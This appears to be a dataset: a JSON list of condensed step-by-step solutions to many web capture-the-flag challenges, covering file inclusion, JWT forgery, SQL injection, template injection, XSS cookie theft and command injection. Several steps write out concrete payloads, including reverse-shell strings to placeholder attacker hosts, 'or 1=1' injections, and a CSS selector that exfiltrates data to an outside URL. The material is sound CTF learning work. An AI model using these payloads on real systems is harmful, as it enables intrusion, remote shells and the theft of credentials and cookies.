[
    "Visited the website.",
    "Observed redirection to '/?file=wc.php'.",
    "Visited '/?file=/etc/passwd'.",
    "Confirmed server-side file inclusion.",
    "Discovered 'robots.txt' file at '?file=robots.txt'.",
    "Discovered the existence of 'checkpass.php'.",
    "Visited '/?file=checkpass.php'.",
    "Realized the page contained some secret potentially usable code.",
    "Used 'php://filter' to view the source of 'checkpass.php'.",
    "Discovered the password 'w0rdc0unt123'.",
    "Used 'php://filter' again.",
    "Decoded base64 strings to view the source code of 'wc.php'.",
    "Plugged the password ('w0rdc0unt123') from '$password' variable to the cookie.",
    "Accessed the webpage.",
    "Identified that the user input '$text' from get param 'text' was being used.",
    "Realized '$text' was passed into 'exec' leading to potential remote code execution.",
    "Input the payload '; ls #'.",
    "Realized 'echo exec(...)' only returns the last line of the output.",
    "Input the payload to attempt to spawn a reverse shell.",
    "Used shell access to browse the file system.",
    "Discovered a folder '/ctf'.",
    "Identified notable shell script 'findaas' inside '/ctf'.",
    "Executed './findaas flag.txt' command.",
    "Located 'flag.txt'.",
    "Attempted to read the flag using 'cat ./system/of/a/down/flag.txt'.",
    "Received permission denied error.",
    "Read the 'README' file.",
    "Found a password hash '6f246c872cbf0b7fd7530b7aa235e67e'.",
    "Decoded the password hash.",
    "Found password 'csictf'.",
    "Switched to the user 'ctf'.",
    "Authenticated using the password 'csictf'.",
    "Executed 'cat ./system/of/a/down/flag.txt' command.",
    "Printed the flag.",
    "Locate the route '/login' in the website source.",
    "Locate the route '/adminNames' in the website source.",
    "Visit the '/login' route.",
    "Observe the form to fill.",
    "Submit the form.",
    "Monitor the Network Tab responses.",
    "Look for a JWT in the 'token' header of the responses.",
    "Decode the JWT at jwt.io.",
    "Inspect the decoded payload.",
    "Take note of the 'username' from the form inputs.",
    "Recognize that the 'username' has been rot13 encoded in the decoded JWT.",
    "Apply rot13 decoding on the 'admin' value.",
    "Observe that the decoded value of 'admin' is 'false'.",
    "Have the intention to alter the 'admin' value.",
    "Intend to rot13 encode the value 'true'.",
    "Recognize that altering the 'admin' value requires the JWT secret.",
    "Navigate to the '/adminNames' route.",
    "Observe that it prompts a file download.",
    "Inspect the downloaded file and find a GitHub URL.",
    "Visit the GitHub URL.",
    "Observe that it leads to a list of admin usernames.",
    "Have the intention to alter the JWT 'username'.",
    "Decide to use the rot13-encoded version of a listed admin username.",
    "Examine the request route for '/adminNames'.",
    "Identify the route as '/getFile?file=admins'.",
    "Experiment with the '/getFile?file=...' route.",
    "Replace 'admins' with '.env' in the route.",
    "Or replace 'admins' with '../.env' in the route.",
    "Download the '.env' file.",
    "Recognize that the '.env' file contains the JWT secret.",
    "Create a new token.",
    "Use the JWT secret and the altered payload for the new token.",
    "Visit the '/admin' route.",
    "Monitor the response for headers.",
    "Identify headers that require a token.",
    "Recognize the need for an 'Authorization' header.",
    "Identify that the 'Authorization' header should contain a JWT.",
    "Send a GET request.",
    "Include the correct 'Authorization' header.",
    "Use the new token for authentication.",
    "Receive a response text.",
    "Recognize that the response text contains the flag.",
    "Note that the flag is in rot13 encoding.",
    "Decode the flagged text.",
    "Recognize that the decoded text is the true flag.",
    "Read the challenge description and requirements",
    "Identify that the vulnerability lies in Express query parsing",
    "Study server.js",
    "Identify the conditions for file retrieval",
    "Note that spaces or slashes in the filename are not allowed",
    "Note that filename length must be five or less",
    "Note that only js, ts, cpp, c files are allowed",
    "Infer that the flag is inside a `flag.txt`",
    "Note that filename restrictions need to be bypassed to get the flag",
    "Note that an array passed in 'file' GET parameter gets converted and concatenated into a string",
    "Note that comma separation is added between each element of the array in the string format",
    "Note that this method of passing an array satisfies the filename restrictions",
    "Note that '.' and 'js' need to be the last two elements of the array",
    "Note that this arrangement is necessary to pass the file type check",
    "Construct a parameter that meets the conditions and requests the flag file",
    "Pass `['a', 'b', 'c', 'd', '/../flag.txt', '.', 'js']` as an array via the GET parameter",
    "Use only the first five elements of the array to create the file name",
    "The file name resolves to `flag.txt` after the process",
    "Send a GET request to the server",
    "Include the parameter `/getFile?file[]=a&file[]=b&file[]=c&file[]=d&file[]=/../flag.txt&file[]=.&file[]=js` in the request",
    "Retrieve the flag from the server response",
    "The flag is `csictf{5h0uld_5tr1ng1fy_th3_p4r4ms}`",
    "Search the challenge description online",
    "Find a quote from Mr. Robot",
    "Signify checking out the website's 'robots.txt'",
    "Open the website",
    "Observe that the website serves an 'index.html' file",
    "Read the information about 'Brobot' in the 'index.html' file",
    "Understand the information as a hint towards 'robots.txt'",
    "Access 'robots.txt'",
    "Discover a disallowed route '/fade/to/black'",
    "Visit the disallowed route",
    "Obtain the flag",
    "Access the website",
    "Identify the cookie related to flavor",
    "Decode the cookie using base64 decoding",
    "Replace the existing flavor value in the cookie with 'chocolate'",
    "Encode new cookie value into base64",
    "Replace the original cookie with the new base64 encoded 'chocolate' cookie on the website",
    "Retrieve the flag",
    "Analyze the secure portal page source",
    "Decipher that the JavaScript in the source code was obfuscated",
    "Note that the password for the portal is being checked by the script",
    "Translate the hex-encoded list, var _0x575c, into a more readable format",
    "Understand many calls to 'window' were made in the CheckPassword function",
    "Realize the calls to 'window' essentially represent 'window.localStorage.setItem'",
    "Understand that the password was split into various parts",
    "Realize the split parts were stored against assigned keys",
    "Use 'window.localStorage.getItem' to check our input password against the split parts",
    "Realize it is similar to 'window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]]'",
    "Combine all password parts into a single string",
    "Enter the combined password into the portal",
    "Access the URL",
    "Find the input box",
    "Enter a color",
    "Click the submit button",
    "Identify the hidden field 'password'",
    "Get the value from the cookie",
    "Insert 'blue}; input[type=\"password\"][value^=\"c\"] {background-image: url('https://example.com?c');' into the color input field",
    "Test CSS injection",
    "Extract the first character of the password",
    "Submit a CSS selector for a potential starting letter of the password",
    "Repeat for all potential starting letters",
    "Use iterative deepening",
    "Inject similar code into the input box",
    "Update the prefix",
    "Inject CSS through the input box",
    "Guess combinations of characters",
    "Reveal the entire password",
    "Pass the final payload '/admin'",
    "Extract the admin cookie 'password'",
    "Analyze the server script running at the provided URL.",
    "Observe that the server script takes user input as the 'icecream' value.",
    "Observe that the server script uses a secure cookie for comparison to display a flag value.",
    "Visit the URL with the payload '?icecream={{globals()}}'.",
    "Discover the variable name 'application' linked to the tornado.web.Application object.",
    "Run the server script with a new payload '?icecream={{application.settings[\"cookie_secret\"]}}'.",
    "Retrieve the cookie_secret value 'MangoDB'.",
    "Adjust the value of the secure cookie 'admin' to the desired comparison value 'true'.",
    "Create a signed cookie in the browser.",
    "Replace the original signed cookie with the new one generated.",
    "Reload the server script.",
    "Successfully change the website content from the original message to the target flag value 'csictf{h3r3_i_4m}'.",
    "Review the given PHP code.",
    "Understand what the code does.",
    "Notice that to match the value of 'hash' and 'target', the 'hash' param cannot equal '10932435112'.",
    "Realize that the sha1 hashes of 'hash' and 'target' will not match.",
    "Understand that brute forcing is not a viable option.",
    "Identify that the '$hash' and the '$target' are matched using '==' instead of '==='.",
    "Understand that this makes the match vulnerable to type juggling.",
    "Identify that the sha1 hash of '10932435112' starts with '0e...'.",
    "Understand that any other sha1 hash starting with the same prefix will match the target.",
    "Realize the role of type juggling in this matching process.",
    "Identify hashes that start with the '0e' prefix.",
    "Understand that these hashes match the target through brute forcing.",
    "Select any one of the identified hashes.",
    "Pass this hash with the GET parameter 'hash' to the server.",
    "Retrieve the flag from the server.",
    "Followed the challenge description",
    "Noted the use of the 'flask_caching' module for the app",
    "Researched the 'flask_caching' module",
    "Found that the 'flask_caching' module can store a python pickle in redis",
    "Discovered that the python pickle can be prepended with '!'",
    "Learned about python pickles",
    "Understood how python pickles can be used for Remote Code Execution",
    "Realized that caching modules use 'pickle.load()' to load cached data",
    "Prepared my server for listening with netcat",
    "Set up a netcat listener on my server",
    "Constructed a command to be executed",
    "Created a payload using python pickle containing a command execution statement",
    "Slept for half a second",
    "Read the just created payload",
    "Sent the payload to the challenge webpage URL using a POST request",
    "Sent a GET request to access the cache data",
    "Triggered the command execution on the server side",
    "Observed the output on my netcat listener",
    "Identified the CTF flag",
    "Confirm the challenge 'Gif2png' exists.",
    "Determine that the challenge requires interaction with a Flask application.",
    "Analyze a Python script.",
    "Identify the source code of the application.",
    "Focus on the command line subprocess interaction.",
    "Identify the specific line of code related to the command line subprocess interaction.",
    "Identify the critical line.",
    "Realize that the critical line could potentially lead to Remote Command Execution (RCE).",
    "Understand that the interaction with the filename being uploaded is the potential vulnerability for RCE.",
    "Begin preparing an attack.",
    "Decide to exploit the RCE vulnerability.",
    "Choose the '-vf drawtext=...' option within the 'ffmpeg' command as the method of exploitation.",
    "Intend to inject a 'grep' command to look for the flag in the main.py file.",
    "Craft a payload for the attack.",
    "Formulate the payload in the format 'csictf.gif' -vf drawtext=\\\"text=$(grep ffLaG main.py)\\\"'.gif'.",
    "Intend to use the crafted payload as the filename of the uploaded gif file.",
    "Perform the action of uploading the gif.",
    "Use the crafted filename for the uploaded gif.",
    "Conduct an analysis on the resulting PNG file.",
    "Discover that the flag is written on the resulting PNG file.",
    "Perform the action of extracting the flag.",
    "Observe that the extracted flag is 'cybrics{imagesaresocoolicandrawonthem}'.",
    "Access the source URL",
    "Open the URL in a browser",
    "Open the Browser Devtools",
    "Access the website's source code",
    "Search for the function addCaptcha() in the JavaScript code",
    "Identify the functionality of the addCaptcha() function",
    "Open the function addCaptcha() in the devtools",
    "Locate the loop() function within addCaptcha()",
    "Remove the loop() function from addCaptcha()",
    "Access the JavaScript console in the devtools",
    "Call the addCaptcha() function",
    "Repeat the previous substep 4 more times",
    "Locate the captcha boxes on the screen",
    "Click on a captcha box",
    "Repeat the previous substep 4 more times",
    "Verify if all 5 captchas are collected",
    "Locate the 'GET FLAG' button",
    "Click on the 'GET FLAG' button",
    "Verify if the flag is displayed on the screen",
    "Select and copy the flag",
    "Open the website 'very.uniquename.xyz:8880'",
    "Read the challenge hint",
    "Guess that language setting may be relevant to solve puzzle",
    "Observe the image",
    "Deduce that the language might be Swedish",
    "Open the cURL tool",
    "Set the language headers to Swedish",
    "Execute the command 'curl -H \"Accept-Language: sv-SE\" very.uniquename.xyz:8880'",
    "Run the command 'curl -H \"Accept-Language: sv-SE\" very.uniquename.xyz:8880'",
    "Retrieve the flag 'dsc{1_l0v3_sw3d3n}'",
    "Open the link 'very.uniquename.xyz:2052'",
    "Observe the page showing logos of Xbox and Linux",
    "Change User-Agent to 'Linux' using a curl command",
    "Observe the result",
    "Notice the Linux logo is gone from the page",
    "Change User-Agent to 'Linux Xbox' using curl",
    "Receive the flag in the body of the returned page",
    "Open web browser.",
    "Enter the URL 'overly.uniquename.xyz:2095'.",
    "Open cURL.",
    "Change the HTTP method to POST.",
    "Locate the 'User-Agent' header in the HTTP request.",
    "Change the 'User-Agent' header to mimic a Google bot.",
    "Locate the 'Referer' header in the HTTP request.",
    "Set the 'Referer' header as 'google.com'.",
    "Locate the 'Host' header in the HTTP request.",
    "Set the 'Host' as 'dscvit.com'.",
    "Locate the 'Cookie' header in the HTTP request.",
    "Set the cookie as 'user=root'.",
    "Locate the 'Content-Type' header in the HTTP request.",
    "Set the 'Content-Type' as 'application/json'.",
    "Open the body of the HTTP request.",
    "Add a JSON object '{\"foo\":\"bar\"}' to the body.",
    "Review the error received.",
    "Add 'messi' as a key in the JSON object in the HTTP request.",
    "Review the second error received.",
    "Change the value of the 'messi' key to 'psg'.",
    "Verify reception of the flag 'dsc{th15_15_w4y_t00_much_w0rk}'.",
    "Begin SQL Injection attack",
    "Use combination of uppercase, lowercase, numbers, underscore, and curly braces for domain",
    "Define conditional statement",
    "Initialize certain variables with specific values if challenge is 'taxi union'",
    "Assign specific values to variables if challenge is 'Gate keeper'",
    "Enter while loop",
    "Iterate over every character in the domain",
    "Build up the 'payload'",
    "Create 'payload' in the format of a SQL statement",
    "Use OR operator to guess the next character in the password",
    "Send POST request to server",
    "Include 'payload' as the data",
    "Check if response contains 'check' string",
    "If it does, append guessed character to 'flag' and continue process",
    "Check if guessed character is in password",
    "If it is not, continue loop with next character",
    "Continue script until full password is discovered",
    "Opened the given link",
    "Checked the network tab",
    "Found a response header",
    "Sent a curl request",
    "Set the cookie to a given string",
    "Received a response",
    "Identified the new flag value in the response",
    "Sent another curl request",
    "Set the new flag value as the cookie",
    "Received another response",
    "Identified a different flag value in the response",
    "Decided to write a script to automate the process",
    "Wrote a Python script to automate the requests",
    "Implemented a logic that changes the cookie flag each time a request is made",
    "Set 'EOF' as the termination condition of the script",
    "Obtained a sequence of hexadecimal values",
    "Concluded that they seemed to be MD5 hashes",
    "Decrypted the MD5 hashes",
    "Revealed and identified a string",
    "Noticed that the decrypted string could form a meaningful phrase",
    "Concluded the phrase to be a flag after concatenating the chunks",
    "The author identifies it as a SQL Injection challenge.",
    "The author sets up the environment to exploit the SQL Injection challenge.",
    "Para meters and values such as 'domain', 'check', 'key', and 'column' are initialized.",
    "These parameters are set up to be manipulated later.",
    "The author sets a condition to set the parameters based on the specific challenge.",
    "This solution works for the 'Gate Keeper' challenge as well.",
    "The condition to receive the CTF password (flag) is checked.",
    "If the condition is not met, the script continues iterating.",
    "In each iteration, the author forms SQL Injection payload.",
    "The characters from the 'domain' are progressively appended to the payload.",
    "The payload is sent to the target URL via POST request.",
    "The data content for the request is constructed dynamically with a key-value pair.",
    "The key for the key-value pair is retrieved from the 'key' variable.",
    "The value for the key-value pair is the payload.",
    "A check is performed on the response text.",
    "The check is to see if the response text contains 'check'.",
    "'check' is a predefined string expected in the response of a successful login.",
    "If the check is successful, it indicates that the payload was able to pass through SQL Injection.",
    "A valid login has been achieved.",
    "The iterated character is added to the 'flag'.",
    "The 'flag' value updates with the successful character.",
    "The process is repeated until the end of the flag is found.",
    "Analyzed the source code of the web application",
    "Noticed that body-parser is set to allow arrays and objects",
    "Noticed that the output in the /login POST route has not been stringified",
    "Realized it gives the possibility to pass an object in the query statement",
    "Studied the official `mysql` docs",
    "Understood how objects are handled",
    "Inferred the username to be michelle",
    "Attempted to pass an object in place of password",
    "Used a known attribute in the object",
    "Submitted the payload 'csrf&username=michelle&password[username]=michelle'",
    "This makes password an object",
    "Understood that objects are converted",
    "Understood that converted attributes are comma separated",
    "Understood that 'password' = 'username' evaluates to 0",
    "Understood that 0 compared with 'michelle' returns true",
    "Used the exploit to log in",
    "Executed a curl command to make a POST request",
    "The payload was included in the request",
    "Extracted the session cookie",
    "Used the session cookie to visit /flag",
    "Collected the flag",
    "Wrote a python script",
    "The script automates the process",
    "The process includes sending the POST request, extracting the cookie, and getting the flag",
    "Visit the website.",
    "Find a cookie that contains a JWT hashed with HS256.",
    "Use rockyou.txt as the wordlist.",
    "Brute force the JWT secret with John The Ripper.",
    "Discover the secret to be 'supersecret'.",
    "Create a JWT with 'username: admin'.",
    "Add the new JWT to the cookie.",
    "Impersonate an admin.",
    "Visit a non-existent route starting with '/admin/'.",
    "Trigger a 404 error page.",
    "Discover a template injection vulnerability.",
    "Exploit the template injection vulnerability.",
    "Climb the Python MRO hierarchy.",
    "List all usable classes.",
    "Find the 'subprocess.Popen' class.",
    "Note the class index as 405.",
    "Use the 'subprocess.Popen' class.",
    "Spawn a reverse shell.",
    "Start a 'netcat' listener on your server.",
    "Specify the port number.",
    "Gain a shell.",
    "List the directory.",
    "Find the file named 'flag.txt'.",
    "Connect to the URL http://jh2i.com:50000",
    "Interpret the hint given",
    "Change the User-Agent header in the request",
    "Send a GET request to the URL",
    "Use Python's requests library",
    "Modify the User-Agent",
    "Inspect the returned data",
    "Retrieve the flag",
    "Open a browser.",
    "Enter the given URL in the address bar.",
    "Open the developer tools on the browser.",
    "Select and observe the local storage.",
    "Navigate to the 'Sources' tab in the developer tools.",
    "Identify the JS file 'jquery.jscroll2.js'.",
    "Open 'line 1' of the 'jquery.jscroll2.js' JS file.",
    "Create a Python script to convert the hexadecimal values in the line to strings.",
    "Run the Python script.",
    "Analyze the functionality of the converted code snippet.",
    "Identify that the snippet converts a base64 string to ASCII and stores it in local storage under the key 'flag'.",
    "Launch terminal.",
    "Run a command to convert the base64 string to ASCII.",
    "Observe the output of the conversion command to obtain the flag.",
    "Open a web browser.",
    "Visit the URL: https://redpwn.net/",
    "Open the web browser.",
    "Press the 'Ctrl' key on the keyboard.",
    "While holding the 'Ctrl' key, press the 'U' key on the keyboard.",
    "View the HTML source code.",
    "Search for a string formatted as 'flag{...}' in the HTML source code.",
    "Read the HTML source code.",
    "Identify a meta tag with the name attribute 'redpwnctf2020' in the HTML source code.",
    "Retrieve the value of the content attribute from the identified meta tag.",
    "Access the content attribute of the identified meta tag containing the flag.",
    "Copy the value of the content attribute: 'flag{1nspector_g3n3ral_at_w0rk}'",
    "Visit the source URL provided for the challenge.",
    "Identify the challenge as a beginner SQL Injection challenge.",
    "Infer from the knowledge of SQL Injection that the username and password input can be manipulated.",
    "Inject a classic SQL Injection payload (' or 1=1 -- ) into the username field.",
    "Inject a classic SQL Injection payload (' or 1=1 -- ) into the password field.",
    "Bypass authentication by making the conditional statement in the SQL query always true due to the SQL Injection.",
    "Inject the SQL Injection payload into the username field.",
    "Inject the SQL Injection payload into the password field.",
    "Submit the manipulated username and password.",
    "Receive an alert from the website.",
    "Read the flag from the alert.",
    "Read the flag displayed in the alert.",
    "Recognize that the function for generating a token is using string interpolation to inject variables directly into the token string.",
    "Realize that using string interpolation instead of object properties can lead to code injection vulnerabilities.",
    "Identify that the 'member' field within the token object is currently set to 0.",
    "Understand that by adding the necessary characters to the 'username', it is possible to close the double-quote and manipulate the fields following it in the token.",
    "Pass the 'username' value as ','\"member\":\"1' to the function in order to change the value of 'member' to 1.",
    "Navigate to the '/api/flag' endpoint using the modified token.",
    "Retrieve the flag from the response received after visiting the '/api/flag' endpoint.",
    "Inject a random '<h1>Hello</h1>' tag.",
    "Check for HTML input acceptance.",
    "Look at the JavaScript file in the webpage.",
    "Find that the content is retrieved from the URL in base64 format.",
    "Note that HTML tags are not allowed.",
    "Devise a payload.",
    "Bypass the bracket-based sanitization by adding an extra '>' in the start.",
    "Exploit the arbitrary JavaScript execution via a broken image tag's onerror handler.",
    "Encode the payload in base64.",
    "Add the encoded payload to the URL.",
    "Set up a netcat listener on a local server.",
    "Capture incoming connections.",
    "Submit the crafted URL to the Admin Bot.",
    "Admin Bot visits the URL.",
    "XSS payload is executed.",
    "Capture the Admin Bot's cookies.",
    "Cookies are sent by the executed payload to the netcat listener.",
    "Extract the flag from the Admin Bot's cookies.",
    "Notice the challenge is about Cross-Site Scripting (XSS).",
    "Notice the website allows HTML input.",
    "Identify that the URL of the created webpage is a base64 encoded form.",
    "Identify the content of the page is used to generate the base64 encoded URL.",
    "Observe that the JavaScript code prevents 'script' tags.",
    "Observe that only certain attributes are allowed for an element in the JavaScript code.",
    "Craft an XSS payload.",
    "Utilize the specified attributes to redirect.",
    "Assign the document's cookie to the query parameter of a specified URL.",
    "Ensure the site URL in the payload is using HTTPS.",
    "Prevent Content Security Policy Bypassing.",
    "Generate a webpage with the XSS payload.",
    "Send the generated webpage to the website.",
    "Set up a simple Node.js server backend.",
    "Receive and log the cookie transferred as a query parameter.",
    "Send the generated webpage URL.",
    "Include the XSS payload in the URL.",
    "Send the URL to the 'admin bot'.",
    "Intercept the bot's browser cookie.",
    "Wait for the bot to visit the sabotaged webpage.",
    "Retrieve the flag stored in the intercepted cookie.",
    "Notice the keywords 'page' and 'upload' on the webpage",
    "Identify that these keywords are sourced from the author of the CTF challenge",
    "View the homepage source",
    "Identify a comment prompting the user to 'get the page'",
    "Visit 'http://web.zh3r0.ml:7777/?page=flag'",
    "Receive a gif in response",
    "Check if an 'upload' page exists",
    "Verify that an 'upload' page is mentioned in the challenge description",
    "Confirm the existence of the 'upload' page",
    "Assume a Local File Inclusion (LFI) exploitation is required",
    "Base assumption on the upload page validation",
    "Create a PHP file named 'payload.php'",
    "Include code in 'payload.php' to list all directory files",
    "Specify that files with the name 'flag' are of particular interest",
    "Decide to print all file contents",
    "Search for the flag on the browser",
    "Base decision on receiving multiple 'flag' files",
    "Visit route '/?page=payload'",
    "Use the uploaded PHP file for the request",
    "Find a lot of printed information",
    "Open source code of the webpage",
    "Search for the flag format",
    "Find the flag 'zh3r0{h3y_d1d_y0u_upl04d_php_c0rr3ct1y???_84651320}'",
    "Search in the source code for the flag's presence",
    "Start the challenge instance.",
    "Access the provided source code and link to the running instance.",
    "Examine the login screen.",
    "Examine the main screen with book selections.",
    "Analyze JwtService.java.",
    "Analyze SecretGenerator.Java.",
    "Identify the 'secret key' as '1234'.",
    "Understand implications for encoding and decoding JWT tokens.",
    "Login with given credentials using the Google Chrome Network tab.",
    "Capture the payload of the response, identifying the included JWT token.",
    "Copy the JWT token from the payload.",
    "Decode the copied JWT token using a website like jwt.io.",
    "Obtain the 'userId' from the decoded information.",
    "Modify the 'role' field to 'Admin'.",
    "Encode a new JWT token with the modified 'role'.",
    "Navigate to the 'controllers' directory.",
    "Examine the file UserController.java to identify any useful endpoints.",
    "Open Postman or a similar tool for sending HTTP requests.",
    "Send requests with the newly encoded 'Admin' JWT token to attempt user role update and flag access.",
    "Navigate to the user creation interface on the site.",
    "Create a new user as the default user role is immutable.",
    "Send a request to obtain a list of all users.",
    "Identify the id of the newly created user from the received user list.",
    "Prepare a PATCH request for the new user’s role.",
    "Send the request to modify the new user's role to 'Admin'.",
    "Login using the credentials of the newly promoted 'Admin' user.",
    "Access the book in which the flag is contained.",
    "Start the instance.",
    "Observe the site providing a link to the running instance.",
    "Site has a login screen.",
    "Attempt to login using 'user' as both username and password.",
    "Observe a visible SQL query for the login request.",
    "Recognize the visible SQL query as a potential vulnerability hint.",
    "Enter the payload 'or 1=1;--' into the 'pass' field to attempt a bypass.",
    "Modify the SQL command using the pattern 'SELECT id FROM users WHERE password = '' or 1=1;--' and username set as '123'.",
    "Test various SQL queries to deduce the type of database in use.",
    "Execute the query '123' UNION SELECT 1, sqlite_version(), 3;--'.",
    "Determine from the result that the site uses SQLite as its database.",
    "Execute the query '123' UNION SELECT name, sql, null from sqlite_master;--'.",
    "Review the results to list all tables.",
    "Execute the query '123' UNION SELECT flag, null, null from more_table;--'.",
    "Retrieve the flag from the returned results.",
    "Identify the application.",
    "Confirm the ability to upload TPL files.",
    "Upload a file.",
    "Set the file extension as .tpl.",
    "Generate random content for the file.",
    "Submit the file for identification.",
    "Observe the uploaded file triggering a POST to /upload.php.",
    "Notice a redirection with 302 Found to /index.php.",
    "Confirm that the file content is displayed.",
    "Upload a different file.",
    "Submit the file for observation.",
    "Note the changes in the displayed content.",
    "Attempt to upload a valid PHP file.",
    "Conduct experiments with different content.",
    "Observe the server's response.",
    "Determine that the server's response suggests Server Side Template Injection.",
    "Apply a payload.",
    "Observe the information revealed about the server environment.",
    "Observe the information revealed about the file structure.",
    "Conduct an investigation.",
    "Discover the smarty-4.0.1 PHP library.",
    "Discover the templates_c folder.",
    "Access the template files on the server.",
    "Obtain the content of the template files.",
    "Use a payload to leak the source code of PHP.",
    "Discover the flag within the source code.",
    "Explored the site using ZAP Proxy.",
    "Found paths /, /logout, /login, /forgotpassword.html, /admin, and /dashboard.",
    "Identified /login and /forgotpassword.html as especially interesting.",
    "Attempted to login with 'admin', 'admin' as username and password.",
    "Failed to login with the provided credentials.",
    "Checked the forgot password feature.",
    "Found a snippet of JavaScript code containing database credentials and a 'JSESSIONID' cookie.",
    "Connected to the database using the credentials from the JavaScript code.",
    "Examined the different database schemas and tables: accounts, config, env, innodb, sys, users.",
    "Found a flag in the 'users' schema.",
    "Discovered various other important details in other schemas.",
    "Used the AWS credentials found in the 'config' schema.",
    "Downloaded the contents of an Amazon S3 bucket.",
    "Analyzed the Tomcat log found in the S3 bucket.",
    "Discovered another flag and a GitHub repository.",
    "Cloned the GitHub repository.",
    "Used a private SSH key retrieved from the database for cloning.",
    "Examined the source code of the challenge present in the cloned repository.",
    "Discovered a Dockerfile.",
    "Looked for potential Apache Tomcat vulnerabilities.",
    "Only found a minor vulnerability.",
    "Checked for possible exploitations in the Java Servlet.",
    "Identified vulnerability to log4j 2.14.1.",
    "Attempted to exploit the log4j vulnerability using the 'ProfileServlet.java'.",
    "Used a malicious cookie value for exploitation.",
    "Tried to get the flag using the code provided when exploiting the log4j vulnerability.",
    "Downloaded the code for the app",
    "Examined the contents of the downloaded code",
    "Received npm install warnings during installation",
    "Checked npm audit for vulnerabilities",
    "Researched 'Code Execution through IIFE in node-serialize' advisory",
    "Researched what IIFE (Immediately Invoked Function Expression) is",
    "Attempted to start the app locally with 'npm run start'",
    "Encountered an error due to permissions",
    "Examined server code",
    "Discovered the line 'const port = process.env.PORT || 80'",
    "Clarified how to start the app locally using a non-privileged port",
    "Started the app with 'PORT=8080 npm run start'",
    "Noted the creation of a 'storage.db' file",
    "Opened the 'storage.db' file with a SQLite database reader",
    "Viewed the stored data",
    "Examined the application's source code",
    "Examined the 'index.js' file",
    "Examined the 'login.js' file",
    "Examined the 'logout.js' file",
    "Examined the 'signup.js' file",
    "Identified the 'unserialize()' function",
    "Determined that the function is used in the index route",
    "Understood that the function decodes a user's cookie",
    "Created a test JavaScript file",
    "Injected a malicious payload into the file",
    "Executed the payload using the 'unserialize()' function",
    "Identified the mistake in the test",
    "Determined that the payload was executed before serialization",
    "Corrected the mistake to execute the payload after serialization",
    "Developed a payload to read the flag file",
    "Included code in the payload to return the flag as the username",
    "Intended to display the flag on the welcome page",
    "Generated the finalized payload",
    "Crafted the payload into a representation of a session cookie",
    "Ensured the crafted session cookie matches the expected format used by the application",
    "Applied the payload to the live environment",
    "Delivered the payload via the crafted session cookie",
    "Successfully retrieved the flag",
    "Identify the app as a page.",
    "Identify the presence of a form to create users.",
    "Identify the indication of whether users are admins.",
    "Download the source code.",
    "Identify the app as a Node.js app.",
    "Identify the app as a TypeScript app.",
    "Identify the app as written with Next JS.",
    "Spot the 'auth.ts' file.",
    "Identify a handler function within the file.",
    "Identify the functionality of storing the request body object into a database.",
    "Notice the requests being made to the API endpoint.",
    "Identify the presence of a 'username' attribute in the requests.",
    "Discover the 'schema.prism' file.",
    "Identify the 'User' model within the file.",
    "Identify the 'isAdmin' field within the 'User' model.",
    "Identify the default value of 'false' for the 'isAdmin' field.",
    "Send a request body.",
    "Customize the request body.",
    "Set the 'isAdmin' field to 'true' in the request body.",
    "Retrieve the flag using the customized request.",
    "Identify the application as a WordPress site.",
    "Discover clickable links that reveal 2 blog posts.",
    "Find the blog post page '?p=1'.",
    "Note that we can leave a comment on this page.",
    "Notice that comments need to be approved.",
    "Observe the change in the URL after submitting a comment.",
    "Attempt a Cross-site Scripting (XSS) attack.",
    "Fail due to the site removing <script> tags.",
    "Decide to examine the source code.",
    "Use an Integrated Development Environment (IDE) for examination.",
    "Identify suspicious JavaScript named 'mec-frontend'.",
    "Notice settings related to a calendar.",
    "Observe two <link> tags.",
    "Note that they appear unusual.",
    "Identify 'mec' as relating to a WordPress Plugin.",
    "Find the webpage of the 'Modern events calendar' plugin.",
    "Discover two exploits related to the 'Modern events calendar' plugin.",
    "Find them in the exploit database.",
    "Identify the first exploit.",
    "Determine that it is unusable due to requiring authentication.",
    "Try the second exploit.",
    "Find it to be ineffective.",
    "Accessed the site.",
    "Noticed command execution based on the URL parameter, 'host'.",
    "Set 'host' parameter in URL to '127.0.0.1;cat /etc/passwd'.",
    "Attempted to list the contents of '/etc/passwd'.",
    "Injected '127.0.0.1;bash -c bash -i >& /dev/tcp/<attack-ip-with-netcat-open>/<attacker-netcat-port> 0>&1'.",
    "Attempted to open a reverse shell.",
    "Failed to open a reverse shell.",
    "Attempted '127.0.0.1;ls .' in the URL.",
    "Only 'index.php' was returned from the directory listing.",
    "Used '127.0.0.1;echo $PWD' in URL.",
    "Revealed current directory as '/var/www/html'.",
    "Used '127.0.0.1;env' in URL.",
    "Listed environment variables.",
    "Found no useful information.",
    "Tried '127.0.0.1;ls /root' in URL.",
    "No output was returned.",
    "Failed at multiple attempts to get reverse shell.",
    "Used 'bash -i >& /dev/tcp/<ATTACKER-IP>/<ATTACKER-PORT> 0>&1' as a command.",
    "Attempted opening a webshell.",
    "Failed to get a reverse shell.",
    "Restarted the container.",
    "Attempts to open a reverse shell modified the PHP file.",
    "Caused problems.",
    "Searched for the flag using 'ls /'.",
    "Revealed a 'flag.txt' file.",
    "Read the contents of 'flag.txt'.",
    "Used the command 'cat /flag.txt' as part of the URL parameter.",
    "Observe the name of the challenge.",
    "Observe the text of the challenge that refers to 'robots'.",
    "Attempt to open the 'robots.txt' file.",
    "Identify the disallowed path '/g00d_old_mus1c.php'.",
    "Check the 'robots.txt' file for the disallowed path.",
    "Open the '/g00d_old_mus1c.php' path.",
    "Reveal the flag by accessing the path.",
    "Observe that Baby Eval is a Node app.",
    "Observe that the path '/' lists information including server source code.",
    "Analyze the source codes provided.",
    "Determine that the webpage is created by executing an eval from a payload query parameter or calling the directory() function.",
    "Understand that the goal of the CTF challenge is to fetch the environment variable 'flag'.",
    "Realize that 'eval' can be triggered by entering a payload as the GET query parameter.",
    "Discover that the code uses a blacklist Regex.",
    "Observe that parentheses and some keywords are blocked.",
    "Search for a way to call a function without parentheses.",
    "Find a JavaScript feature called Template Literals.",
    "Realize that Template Literals can be used to call functions without parentheses.",
    "Write a payload using the Template Literal method.",
    "Directly call the directory function with 'flag' as its parameter.",
    "Append the payload '?payload=directory`flag`' to the URL of the webpage.",
    "Conclude that the directory function receives an array with a single string 'flag' as an argument.",
    "Understand that by the function's design, it returns the value of the 'flag' environment variable.",
    "Understand the 'vsCAPTCHA' app.",
    "Identify that the app is written in TypeScript and Deno.",
    "Interpret that 'b1' is initialized with a random number from 0-500.",
    "Interpret that 'b2' is initialized with a random number from 0-500.",
    "Understand that the app listens to 'POST' requests.",
    "Identify that the requests are made to '/captcha'.",
